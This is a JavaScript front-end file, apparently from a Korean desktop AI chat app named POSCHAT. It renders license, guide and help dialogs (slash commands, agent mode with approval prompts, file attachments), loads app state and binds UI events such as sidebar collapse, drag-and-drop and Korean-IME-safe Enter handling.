    h("p", { style: small }, "Copyright © 2026 Beomjoon Kim"),
    h("p", { style: small }, "GNU Affero General Public License v3.0 only (AGPL-3.0-only)"),
    h("div", { class: "row", style: "margin-top:6px;gap:6px;flex-wrap:wrap" },
      h("button", { class: "btn", type: "button", onclick: () => showLicense("license") }, "라이선스 보기"),
      source,
      h("button", { class: "btn", type: "button", onclick: () => showLicense("third") }, "제3자 라이선스")));
  api().license_info().then((info) => { source.href = info.source_url; }).catch(() => {});
  return box;
}

async function showLicense(kind) {
  let info;
  try {
    info = await api().license_info();
  } catch (e) {
    return toast("라이선스 정보를 불러오지 못했습니다: " + e.message);
  }
  const pre = (text) => h("pre", { class: "license-text", style: "white-space:pre-wrap;overflow-wrap:anywhere;font-size:12px;max-height:60vh;overflow:auto" },
    text || "(앱에 들어 있는 파일을 찾지 못했습니다. 저장소의 파일을 보세요.)");
  if (kind === "license") {
    return modal({ title: `${info.license} (${info.spdx})`, wide: true, body: h("div", {},
      h("p", {}, `${info.name} ${info.version} · ${info.copyright}`), pre(info.license_text)), buttons: [{ label: "닫기", value: null }] });
  }
  const body = h("div", {},
    h("p", {}, "이 앱에 들어 있는 제3자 구성 요소는 각자의 라이선스를 따릅니다. 이 버전의 소스: ",
      h("a", { href: info.source_url, target: "_blank" }, info.source_url), " (", h("a", { href: info.source_archive, target: "_blank" }, "zip"), ")"),
    ...info.third_party.map((item, i) => h("details", { open: i === 0 }, h("summary", {}, item.name), pre(item.text))));
  modal({ title: "제3자 라이선스", wide: true, body, buttons: [{ label: "닫기", value: null }] });
}

function showGuide() {
  // 1.19: 큰 제목 + 목차. 목차를 누르면 그 항목을 펼치고 그 자리로 옮겨 간다
  const sections = GUIDE.map(([title, text], i) => h("details", { class: "guide-section", id: `guide-${i}`, open: i === 0 },
    h("summary", {}, h("span", { class: "guide-num", "aria-hidden": "true" }, String(i + 1).padStart(2, "0")), h("span", {}, title)),
    renderMarkdown(text.trim())));
  const toc = h("nav", { class: "guide-toc", "aria-label": "가이드 목차" }, GUIDE.map(([title], i) =>
    h("button", { type: "button", class: "guide-toc-item", onclick: () => {
      sections[i].open = true;
      sections[i].scrollIntoView({ behavior: "smooth", block: "start" });
      sections[i].querySelector("summary")?.focus({ preventScroll: true });
    } }, title)));
  const body = h("div", { class: "guide" },
    h("header", { class: "guide-hero" },
      h("h2", {}, "사용법 가이드"),
      h("p", {}, "POSCHAT의 기능을 주제별로 모았습니다. 아래 목차에서 궁금한 항목을 누르세요.")),
    h("h3", { class: "guide-heading" }, "목차"), toc,
    h("h3", { class: "guide-heading" }, "자세히 보기"), sections);
  modal({ title: "사용법 가이드", body, wide: true, buttons: [{ label: "닫기", class: "primary" }] });
}

function showHelp() {
  const rows = [
    ["/init", "작업 폴더를 분석해 INIT.md를 만듭니다"],
    ["/user 요청", "지금까지의 대화로 내 정보(USER.md)를 작성·업데이트합니다"],
    ["/remember 내용", "모든 대화에서 기억할 내용(memory.md)을 저장합니다"],
    ["/memory", "기억 목록을 보고 지웁니다"],
    ["/usage", "사용량(AI 호출·토큰·POSTECH GenAI 크레딧)을 봅니다"],
    ["/스킬이름 요청", "해당 스킬 지침을 적용해 요청을 수행합니다"],
    ["/help", "이 도움말"],
    ["Enter / Shift+Enter", "보내기 / 줄바꿈"],
  ];
  const body = h("div", {},
    h("table", { class: "help-table" }, rows.map(([a, b]) => h("tr", {}, h("td", {}, a), h("td", {}, b)))),
    h("h3", { style: "margin:18px 0 6px;font-size:15px" }, "에이전트 모드"),
    h("p", { style: "margin:0;color:var(--text-2)" },
      "작업 폴더를 고르고 에이전트를 켜면, AI가 파일을 읽고 검색하고 고치고 명령을 실행하면서 목표를 이룰 때까지 단계적으로 일합니다. ",
      "파일 수정과 명령 실행은 설정에 따라 실행 전에 승인을 받습니다."),
    h("h3", { style: "margin:18px 0 6px;font-size:15px" }, "PO노트"),
    h("p", { style: "margin:0;color:var(--text-2)" },
      "왼쪽 위 PO노트에서 강의를 녹음해 실시간으로 받아 적고, 강의 자료(PPT·PDF 등)와 함께 Markdown 필기 노트를 만듭니다."),
    h("h3", { style: "margin:18px 0 6px;font-size:15px" }, "파일 첨부"),
    h("p", { style: "margin:0;color:var(--text-2)" },
      "입력창의 클립 버튼을 누르거나 파일을 끌어다 놓거나 이미지를 붙여 넣으면 첨부됩니다. ",
      "문서(PDF·Word·PowerPoint·Excel·한글)와 텍스트 파일은 내용을 읽어 함께 보내고, 이미지는 Responses 또는 OpenAI 호환 API에서 모델이 직접 봅니다."),
    h("h3", { style: "margin:18px 0 6px;font-size:15px" }, "내 정보(USER.md)와 메모리(memory.md)"),
    h("p", { style: "margin:0;color:var(--text-2)" },
      "두 파일은 Markdown이며 모든 대화에 함께 전달됩니다. 왼쪽 아래 '내 정보'와 '메모리'에서 직접 고칠 수 있습니다."),
    h("h3", { style: "margin:18px 0 6px;font-size:15px" }, "INIT.md와 스킬"),
    h("p", { style: "margin:0;color:var(--text-2)" },
      "작업 폴더 최상위의 INIT.md는 모든 대화에 프로젝트 지침으로 들어갑니다. ",
      "스킬은 <폴더>/SKILL.md 형식의 지침이며 앱 내장, 사용자 스킬 폴더, 작업 폴더의 skills\\ 에서 읽습니다."),
  );
  modal({
    title: "도움말", body,
    buttons: [{ label: "사용법 가이드", action: (close) => { close(); showGuide(); } }, { label: "닫기", class: "primary" }],
  });
}

/* ---------- 초기화 ---------- */
function applyState(state) {
  S.threads = state.threads;
  S.workspace = state.workspace;
  S.skills = state.skills;
  S.config = state.config;
  S.dataDir = state.data_dir;
  S.version = state.version || "";
  S.distribution = state.distribution || "github";
  S.models = state.models || [];
  S.responsesModels = state.responses_models || [];
  S.modelsSource = state.models_source || "builtin";
  S.anthropicModels = state.anthropic_models || [];
  S.anthropicModelsSource = state.anthropic_models_source || "builtin";
  S.openaiModels = state.openai_models || [];
  S.openaiModelsSource = state.openai_models_source || "builtin";
  S.memory = state.memory || [];
  S.defaultChatUrl = state.default_chat_completions_url || "";
  if (state.credit) S.credit = state.credit;
  S.poAvailable = !!state.po_available;
  if (state.attach_limits) S.attachLimits = state.attach_limits;
  $("#agent-toggle").checked = !!state.config.agent_mode;
  if (window.adaptiveRefreshModels) adaptiveRefreshModels();  // 1.17: 로컬 모델 목록(자동 선택을 켰을 때만, 기다리지 않는다)
  renderThreadModel();
  renderSidebar();
  renderWorkspaceChip();
}

async function chooseWorkspace() {
  const res = await api().choose_workspace();
  S.workspace = res.workspace;
  S.skills = res.skills;
  renderSidebar();
  renderWorkspaceChip();
  if (S.thread && !S.thread.messages.length) renderMessages();
}

const isNarrow = () => window.matchMedia("(max-width: 720px)").matches;
const isTouch = () => window.matchMedia("(pointer: coarse)").matches;

function setCollapsed(collapsed) {
  const focusWasInside = $("#sidebar").contains(document.activeElement);
  const focusWasOpenButton = [$("#btn-expand"), $("#code-sidebar-open"), $(".paper-sidebar-open")].includes(document.activeElement);
  $("#app").classList.toggle("collapsed", collapsed);
  $("#sidebar").inert = collapsed;
  $("#btn-expand").hidden = !collapsed;
  $("#btn-new-top").hidden = !collapsed;
  if (collapsed && focusWasInside) requestAnimationFrame(() => {
    const button = [$("#code-sidebar-open"), $(".paper-sidebar-open"), $("#btn-expand")]
      .find((el) => el && el.getClientRects().length);
    button?.focus();
  });
  if (!collapsed && focusWasOpenButton) requestAnimationFrame(() => $("#btn-collapse").focus());
}

function bindUI() {
  document.querySelectorAll("[data-icon]").forEach((el) => {
    el.insertAdjacentHTML("afterbegin", ICONS[el.dataset.icon]);
  });
  const input = $("#input");
  input.addEventListener("input", () => { autoresize(); updateSend(); updateSlash(); });
  input.addEventListener("keydown", (e) => {
    const menuOpen = !$("#slash-menu").hidden;
    if (menuOpen && (e.key === "ArrowDown" || e.key === "ArrowUp")) {
      e.preventDefault();
      const n = S.slash.items.length;
      S.slash.index = (S.slash.index + (e.key === "ArrowDown" ? 1 : n - 1)) % n;
      updateSlash();
      return;
    }
    if (menuOpen && (e.key === "Tab" || (e.key === "Enter" && !e.isComposing))) {
      e.preventDefault();
      pickSlash(S.slash.index);
      return;
    }
    if (menuOpen && e.key === "Escape") return hideSlash();
    // 한글 조합 중 Enter는 무시해야 마지막 글자가 중복 전송되지 않는다.
    // 터치 화면(휴대폰)의 Enter는 줄바꿈으로 두고 보내기 버튼으로 보낸다.
    if (e.key === "Enter" && !e.shiftKey && !e.isComposing && e.keyCode !== 229 && !isTouch()) {
      e.preventDefault();
      if (!S.busy) send();
    }
  });
  input.addEventListener("blur", () => setTimeout(hideSlash, 100));
  $("#btn-send").addEventListener("click", send);
  const picker = $("#file-input");
  $("#btn-attach").addEventListener("click", () => picker.click());
  picker.addEventListener("change", () => { addFiles(picker.files); picker.value = ""; });
  // 파일 끌어다 놓기, 이미지 붙여 넣기
  const main = $("#main");
  main.addEventListener("dragover", (e) => {
    if (!Array.from(e.dataTransfer?.types || []).includes("Files")) return;
    e.preventDefault();
    main.classList.add("dropping");
  });
  main.addEventListener("dragleave", (e) => { if (e.target === main || !main.contains(e.relatedTarget)) main.classList.remove("dropping"); });
  main.addEventListener("drop", (e) => {
    main.classList.remove("dropping");
    if (!e.dataTransfer?.files?.length) return;
    e.preventDefault();
    addFiles(e.dataTransfer.files);
  });
  input.addEventListener("paste", (e) => {
    const files = Array.from(e.clipboardData?.items || []).filter((it) => it.kind === "file").map((it) => it.getAsFile()).filter(Boolean);
    if (!files.length) return;
    e.preventDefault();
    addFiles(files);
  });
  $("#btn-new").addEventListener("click", newThread);
  $("#btn-new-top").addEventListener("click", newThread);
  $("#btn-collapse").addEventListener("click", () => setCollapsed(true));
  $("#btn-expand").addEventListener("click", () => setCollapsed(false));
  // 좁은 화면에서 사이드바는 화면 위에 겹치는 서랍이다. 바깥(어두운 부분)을 누르면 닫는다.
  $("#app").addEventListener("click", (e) => { if (e.target === $("#app") && isNarrow()) setCollapsed(true); });
  if (isNarrow()) setCollapsed(true);
  $("#btn-workspace").addEventListener("click", chooseWorkspace);
  $("#ws-chip").addEventListener("click", chooseWorkspace);
  $("#btn-skills").addEventListener("click", showSkills);
  $("#btn-mcp").addEventListener("click", () => showHub());
  $("#btn-memory").addEventListener("click", async () => { S.memory = await api().list_memory(); showMemory(); });
  $("#btn-profile").addEventListener("click", () => showNoteEditor("profile"));
  $("#btn-settings").addEventListener("click", showSettings);
  $("#thread-model").addEventListener("change", async (event) => {
    if (!S.thread) return;
    const thread = await api().set_thread_model(S.thread.id, event.target.value);
    if (thread.ok === false) {
      toast(thread.error);
      renderThreadModel();
      return;
    }
    S.thread = thread;
    S.threads = await api().list_threads();
    renderSidebar();
  });
  $("#agent-toggle").addEventListener("change", (e) => {
    S.config.agent_mode = e.target.checked;
    api().set_agent_mode(e.target.checked);
    renderWorkspaceChip();
    if (S.thread && !S.thread.messages.length) renderMessages();
  });
  document.addEventListener("keydown", (e) => {
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key.toLowerCase() === "o") { e.preventDefault(); newThread(); }
    if (e.key === "F11" && !e.ctrlKey && !e.altKey && !e.metaKey) { e.preventDefault(); api().toggle_fullscreen?.(); }
  });
}

async function init() {
  bindUI();
  const state = await api().get_state();
  applyState(state);
  S.runningThreads = new Set(state.running_threads || []);
  S.busy = S.runningThreads.has(S.currentId);
  // 시작할 때 첫 대화를 여는 동안 사용자가 이미 코드·Lab 등을 열었으면 그대로 둔다(닫으면 화면이 저절로 사라진다)
  if (S.threads.length) await openThread(S.threads[0].id, false);
  else await newThread(false);
  updateSend();
  if (!state.config.has_key) showSettings();
  // 새 버전 확인(설정에서 끌 수 있고 6시간에 한 번). 실패해도 사용에 지장이 없으므로 알리지 않는다.
  api().check_for_updates(false).then((r) => { if (r.available) offerUpdate(r); }).catch(() => {});
}

if (window.pywebview && window.pywebview.api) init();
else window.addEventListener("pywebviewready", init, { once: true });
